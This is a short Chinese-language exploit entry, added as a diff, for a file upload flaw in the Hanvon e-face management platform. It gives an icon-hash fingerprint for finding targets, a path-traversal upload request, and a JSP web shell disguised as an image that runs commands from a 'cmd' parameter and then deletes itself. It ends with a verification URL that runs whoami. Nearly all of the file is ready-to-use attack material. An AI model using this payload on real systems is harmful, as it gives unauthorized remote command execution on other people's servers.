@@ -1,0 +1,18 @@
+# 汉王e脸通综合管理平台uploadMeetingFile.do文件上传漏洞
+
+- **系统**：汉王e脸通综合管理平台uploadMeetingFile.do　|　**类型**：文件上传　|　**CVE**：—
+- **指纹**：`icon_hash="1380907357"`
+- **请求**：`POST /manage/intercom/..%3B/..%3B/manage/meetingPersonal/uploadMeetingFile.do HTTP/1.1`
+- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlA…`
+
+**请求体 / payload**
+```
+------WebKitFormBoundaryFfJZ4PlAZBixjELj
+Content-Disposition: form-data; name="file"; filename="1.jsp"
+Content-Type: image/jpeg
+<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+验证路径
+/manage/resource/f82b8187d13c4d699a879e77fac82017.jsp?cmd=whoami
+```
+- **预期**：200　|　—
